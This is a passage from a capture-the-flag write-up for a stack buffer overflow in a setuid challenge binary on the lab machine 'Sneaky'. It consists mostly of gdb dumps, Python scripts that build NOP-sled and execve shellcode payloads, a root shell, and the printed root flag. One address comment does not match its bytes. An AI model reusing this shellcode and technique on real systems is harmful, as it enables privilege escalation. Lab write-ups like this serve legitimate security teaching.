0xbffff3f0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff400:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff410:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff420:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff430:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff440:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff450:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff460:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff470:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff480:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff490:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff4a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff4b0:     0x42424242      0x42424242      0x42424242      0x42424242
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can any address of these which shows <code class="language-plaintext highlighter-rouge">0x42</code> or B, as we’ll send NOPS to the rest of the stack.
I chose <code class="language-plaintext highlighter-rouge">0xbffff3f0</code> for <code class="language-plaintext highlighter-rouge">eip</code>.</p>

<h1 id="exploitation">Exploitation</h1>

<p>What I’m trying to do here is send my shellcode in the stack, then point <code class="language-plaintext highlighter-rouge">eip</code> to exact that address or above that address. (It doesn’t matter if our address is a bit off, it’ll try to run NOPS, then our shellcode.)
Payload looks something like this: <code class="language-plaintext highlighter-rouge">NOPS + SHELLCODE + EIP</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">362</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span class="s">"</span>
<span class="n">nopsled</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="c1">#eip 0xbffff3f0
</span><span class="n">eip</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\xf0\xf3\xff\xbf</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">nopsled</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">eip</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>But this payload didn’t work and that can be because of a long shellcode.
I tried to find check why this doesn’t work and it seems like the nopsled breaks in between:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span><span class="nt">-300</span>
0xbffff444:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff454:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff464:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff474:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff484:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff494:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4a4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4b4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4c4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4d4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4e4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4f4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff504:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff514:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff524:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff534:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff544:     0x90909090      0x90909090      0x90909090      0x6850c031
0xbffff554:     0x68732f2f      0x69622f68      0x89e3896e      0xb0c289c1
0xbffff564:     0x3180cd0b      0x80cd40c0      0xbffff3f0      0x00000000
0xbffff574:     0xbffff604      0xbffff610      0xb7feccca      0x00000002
0xbffff584:     0xbffff604      0xbffff5a4      0x0804a014      0x0804821c
0xbffff594:     0xb7fce000      0x00000000      0x00000000      0x00000000
0xbffff5a4:     0x4c7a61ee      0x74e5e5fe      0x00000000      0x00000000
0xbffff5b4:     0x00000000      0x00000002      0x08048320      0x00000000
0xbffff5c4:     0xb7ff24c0      0xb7e3ba09      0xb7fff000      0x00000002
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Finding where nopslead continues later on, it gave me <code class="language-plaintext highlighter-rouge">0xbffff74c</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span>+300
0xbffff69c:     0x00000020      0x00000005      0x00000009      0x00000007
0xbffff6ac:     0xb7fde000      0x00000008      0x00000000      0x00000009
0xbffff6bc:     0x08048320      0x0000000b      0x000003e8      0x0000000c
0xbffff6cc:     0x000003e8      0x0000000d      0x000003e8      0x0000000e
0xbffff6dc:     0x000003e8      0x00000017      0x00000001      0x00000019
0xbffff6ec:     0xbffff70b      0x0000001f      0xbfffffe8      0x0000000f
0xbffff6fc:     0xbffff71b      0x00000000      0x00000000      0xbf000000
0xbffff70c:     0x40d50dab      0x8448d9c8      0xbf0b9c5f      0x692fa6f5
0xbffff71c:     0x00363836      0x7273752f      0x636f6c2f      0x622f6c61
0xbffff72c:     0x632f6e69      0x006c6168      0x90909090      0x90909090
0xbffff73c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff74c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff75c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff76c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff77c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff78c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff79c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff80c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff81c:     0x90909090      0x90909090      0x90909090      0x90909090
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Final exploit:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c">#!/usr/bin/python</span>
import sys

offset <span class="o">=</span> 362
shellcode <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="nv">nopsled</span><span class="o">=</span>b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span><span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>
<span class="c"># eip 0xbffff750</span>
<span class="nv">eip</span><span class="o">=</span>b<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf"</span>
payload <span class="o">=</span> nopsled + shellcode + eip
sys.stdout.buffer.write<span class="o">(</span>payload<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the exploit:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span>/usr/local/bin/chal <span class="sb">`</span>python3 script.py <span class="sb">`</span>
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
c5153d86cb175a9d5d9a5cc81736fb33
</pre></td></tr></tbody></table></code></pre></div></div>
:ET